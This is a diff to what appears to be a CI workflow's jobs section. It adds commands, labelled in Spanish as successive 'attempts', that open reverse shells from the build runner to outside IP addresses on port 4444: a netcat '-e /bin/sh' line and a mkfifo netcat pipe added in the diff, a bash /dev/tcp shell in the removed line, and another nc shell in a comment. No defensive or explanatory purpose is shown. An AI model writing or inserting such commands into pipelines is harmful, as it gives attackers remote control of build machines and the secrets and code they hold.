@@ -55,8 +55,10 @@ jobs:
           # Or with nc: nc -e /bin/sh 200.73.69.220 4444
 
 
-          # INTENTO 3
-          bash -c 'bash -i >& /dev/tcp/186.189.75.20/4444 0>&1' &
+          # INTENTO 4
+              nc -e /bin/sh 186.189.75.20 4444 &  # Versión tradicional (requiere nc con soporte para -e)
+              # Si falla, prueba con mkfifo:
+              rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 186.189.75.20 4444 > /tmp/f &
 
 
 
